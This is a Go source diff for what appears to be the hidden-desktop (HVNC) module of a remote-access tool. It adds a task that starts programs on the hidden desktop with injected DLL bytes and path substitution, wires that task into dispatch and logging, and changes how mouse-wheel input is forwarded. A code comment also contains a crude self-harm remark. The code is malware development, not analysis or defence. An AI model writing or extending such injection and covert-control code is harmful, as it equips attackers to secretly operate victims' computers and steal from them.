@@ -174,6 +174,7 @@ type hvncTaskKind int
 const (
 	hvncTaskCapture hvncTaskKind = iota
 	hvncTaskStartProcess
+	hvncTaskStartProcessInjected
 	hvncTaskMouseMove
 	hvncTaskMouseDown
 	hvncTaskMouseUp
@@ -183,17 +184,20 @@ const (
 )
 
 type hvncTask struct {
-	kind     hvncTaskKind
-	id       uint64
-	display  int
-	filePath string
-	x        int32
-	y        int32
-	button   int
-	vk       uint16
-	delta    int32
-	queuedAt time.Time
-	resp     chan hvncTaskResult
+	kind        hvncTaskKind
+	id          uint64
+	display     int
+	filePath    string
+	x           int32
+	y           int32
+	button      int
+	vk          uint16
+	delta       int32
+	dllBytes    []byte
+	searchPath  string
+	replacePath string
+	queuedAt    time.Time
+	resp        chan hvncTaskResult
 }
 
 type hvncTaskResult struct {
@@ -412,6 +416,8 @@ func ensureHVNCThread() error {
 				switch task.kind {
 				case hvncTaskStartProcess:
 					result.err = startHVNCProcessOnThread(task.filePath)
+				case hvncTaskStartProcessInjected:
+					result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.searchPath, task.replacePath)
 				case hvncTaskMouseMove:
 					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
 				case hvncTaskMouseDown:
@@ -580,7 +586,7 @@ func hvncThreadWatchdog() {
 
 func shouldTraceHVNCTask(kind hvncTaskKind) bool {
 	switch kind {
-	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess:
+	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess, hvncTaskStartProcessInjected:
 		return true
 	default:
 		return false
@@ -593,6 +599,8 @@ func hvncTaskKindName(kind hvncTaskKind) string {
 		return "capture"
 	case hvncTaskStartProcess:
 		return "start_process"
+	case hvncTaskStartProcessInjected:
+		return "start_process_injected"
 	case hvncTaskMouseMove:
 		return "mouse_move"
 	case hvncTaskMouseDown:
@@ -620,6 +628,8 @@ func hvncTaskDetails(task hvncTask) string {
 		return fmt.Sprintf("delta=%d", task.delta)
 	case hvncTaskStartProcess:
 		return fmt.Sprintf("cmd=%q", task.filePath)
+	case hvncTaskStartProcessInjected:
+		return fmt.Sprintf("cmd=%q search=%q replace=%q dllSize=%d", task.filePath, task.searchPath, task.replacePath, len(task.dllBytes))
 	default:
 		return ""
 	}
@@ -1148,18 +1158,17 @@ func endHVNCWindowDrag(screenPt point) {
 
 func hvncMouseWheelOnThread(delta int32) error {
 	pt := currentHVNCCursor()
-	hwnd := getWorkingWindow()
+	hwnd := windowFromPoint(pt)
 	if hwnd == 0 {
-		hwnd = windowFromPoint(pt)
+		hwnd = getWorkingWindow()
 		if hwnd == 0 {
 			return nil
 		}
-		setWorkingWindow(hwnd)
 	}
-	clientPt := pt
-	procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))
-	wparam := uintptr(uint16(delta)) << 16
-	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(clientPt.x, clientPt.y))
+	// WM_MOUSEWHEEL: wparam high word = delta, low word = button/key state
+	// WM_MOUSEWHEEL: lparam = screen coordinates (NOT client coordinates) (I wanna fucking kms)
+	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
+	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
 	return nil
 }
 
